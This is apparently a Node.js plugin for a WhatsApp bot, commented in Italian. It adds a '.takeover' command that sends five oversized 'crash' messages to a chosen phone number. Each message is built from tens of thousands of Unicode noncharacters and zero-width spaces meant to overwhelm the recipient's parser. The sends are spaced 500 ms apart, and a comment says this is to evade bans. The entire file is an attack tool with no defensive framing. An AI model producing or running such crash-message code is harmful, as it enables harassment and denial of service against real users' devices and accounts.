/*
 * Plugin .takeover per WhatsApp (Baileys/Node.js) - INVIA 5 TRAVE CRASH
 * Comando: .takeover <numero> (formato internazionale)
 * Solo owner (lista UUID/ID)
 */

const { WAConnection, MessageType } = require('@adiwajshing/baileys');
const conn = new WAConnection();

// Lista owner (inserisci ID reali)
const owners = ['owner_id_1', 'owner_id_2'];

// Messaggio crash: 5 trava con payload esadecimali overflow (UTF-8 malformato)
function buildCrashPayload() {
    // Payload di 65KB con sequenze di byte 0xFF e 0xFE (non validi UTF-8)
    let payload = '';
    for (let i = 0; i < 65000; i++) {
        payload += (i % 2 === 0) ? '\uFFFE' : '\uFFFF';
    }
    // Aggiunta di caratteri di controllo zero-width per saturare parser
    payload += '\u200B'.repeat(5000);
    return payload;
}

async function takeover(targetNumber) {
    // Verifica owner
    if (!owners.includes(conn.user.id)) {
        console.log('Comando riservato agli owner.');
        return;
    }

    // Formatta numero
    const jid = targetNumber.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    // Invia 5 messaggi crash con intervallo 500ms (evita ban)
    for (let i = 0; i < 5; i++) {
        try {
            await conn.sendMessage(jid, buildCrashPayload(), MessageType.text);
            console.log(`Trava ${i+1}/5 inviato a ${targetNumber}`);
        } catch (e) {
            console.log(`Errore invio trava ${i+1}: ${e.message}`);
        }
        // Delay 500ms tra un invio e l'altro
        await new Promise(res => setTimeout(res, 500));
    }
}

// Esempio di esecuzione (da riga comando o evento messaggio)
// conn.on('message', async (msg) => {
//     if (msg.content === '.takeover 393123456789') {
//         await takeover('393123456789');
//     }
// });

module.exports = { takeover };